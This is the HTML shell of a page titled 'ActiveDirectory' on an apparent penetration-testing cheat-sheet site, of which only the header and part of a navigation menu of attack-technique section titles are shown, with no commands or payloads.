
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../../../old/old_ActiveDirectory/Stacking/PrivilegedAccess/">
      
      
        <link rel="next" href="../01-NoCredentials/DomainEnumeration/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.36">
    
    
      
        <title>ActiveDirectory - PenTest Cheat Sheet</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.06209087.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../overrides/custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#no-credentials" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="PenTest Cheat Sheet" class="md-header__button md-logo" aria-label="PenTest Cheat Sheet" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            PenTest Cheat Sheet
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              ActiveDirectory
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="lime"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="PenTest Cheat Sheet" class="md-nav__button md-logo" aria-label="PenTest Cheat Sheet" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    PenTest Cheat Sheet
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Welcome to MkDocs
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Old
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Old
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_README/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SCANNING
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Phases
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Phases
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1" id="__nav_2_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    1 Enumeration
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1">
            <span class="md-nav__icon md-icon"></span>
            1 Enumeration
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/InformationGathering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Infrastructure Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Nmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nmap:
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3" id="__nav_2_2_1_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Ports
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3">
            <span class="md-nav__icon md-icon"></span>
            Ports
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/Ports/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ports
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_2" id="__nav_2_2_1_3_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    111,2049(NFS)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_2">
            <span class="md-nav__icon md-icon"></span>
            111,2049(NFS)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/111%2C2049%28NFS%29/NFS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NFS
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_3" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_3" id="__nav_2_2_1_3_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    139,445(SMB)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_3">
            <span class="md-nav__icon md-icon"></span>
            139,445(SMB)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/139%2C445%28SMB%29/SMB/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMB
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_4" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_4" id="__nav_2_2_1_3_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    21(FTP)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_4">
            <span class="md-nav__icon md-icon"></span>
            21(FTP)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/21%28FTP%29/FTP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FTP:
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_5" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_5" id="__nav_2_2_1_3_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    25,587(SMTP)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_5">
            <span class="md-nav__icon md-icon"></span>
            25,587(SMTP)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/25%2C587%28SMTP%29/SMTP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMTP
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_6" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_6" id="__nav_2_2_1_3_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    3389(RDP)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_6">
            <span class="md-nav__icon md-icon"></span>
            3389(RDP)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/3389%28RDP%29/RDP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RDP
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_7" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_7" id="__nav_2_2_1_3_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    53(DNS)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_7">
            <span class="md-nav__icon md-icon"></span>
            53(DNS)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/53%28DNS%29/DNS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    REVERSE DNS:
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_8" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_8" id="__nav_2_2_1_3_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    5985,5986(WINRM)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_8">
            <span class="md-nav__icon md-icon"></span>
            5985,5986(WINRM)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/5985%2C5986%28WINRM%29/WINRM/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WINRM
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_1_3_9" >
        
          
          <label class="md-nav__link" for="__nav_2_2_1_3_9" id="__nav_2_2_1_3_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    80,443(Web)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_1_3_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_1_3_9">
            <span class="md-nav__icon md-icon"></span>
            80,443(Web)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DIRECTORIES SCANNING
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2 VulnerabilityAssessment
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_2">
            <span class="md-nav__icon md-icon"></span>
            2 VulnerabilityAssessment
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/VulnerabilityAssessment/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    VulnerabilityAssessment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2_2_2" id="__nav_2_2_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Web
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_2_2">
            <span class="md-nav__icon md-icon"></span>
            Web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_2_2_2_1" id="__nav_2_2_2_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    OWASP
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_2_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_2_2_1">
            <span class="md-nav__icon md-icon"></span>
            OWASP
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/DirectoryTrasversal/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Directory Traversal
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/FileUpload/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FileUpload
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/LFI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LOCAL FILE INCLUSION(LFI)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/NOSQLI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NOSQL INJECTION(NOSQLI)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/RCE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    REMOTE COMMAND INJECTION
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL INJECTION(SQLi)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/SSTI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Server Side Template Injection(SSTI)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/XEE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    XML External Entity(XEE)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/2-VulnerabilityAssessment/Web/OWASP/XSS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross Site Scripting(XSS)
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_2_3" id="__nav_2_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    3 Exploitation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_3">
            <span class="md-nav__icon md-icon"></span>
            3 Exploitation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3_1" >
        
          
          <label class="md-nav__link" for="__nav_2_2_3_1" id="__nav_2_2_3_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    BruteForce
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_3_1">
            <span class="md-nav__icon md-icon"></span>
            BruteForce
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/3-Exploitation/BruteForce/PasswordsAttack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Passwords Attack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/3-Exploitation/BruteForce/Protocols/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Protocols
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2_3_2" id="__nav_2_2_3_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_3_2">
            <span class="md-nav__icon md-icon"></span>
            Metasploit
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/3-Exploitation/Metasploit/Metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_3_3" >
        
          
          <label class="md-nav__link" for="__nav_2_2_3_3" id="__nav_2_2_3_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Shell
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_3_3">
            <span class="md-nav__icon md-icon"></span>
            Shell
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/3-Exploitation/Shell/Shell/" class="md-nav__link">
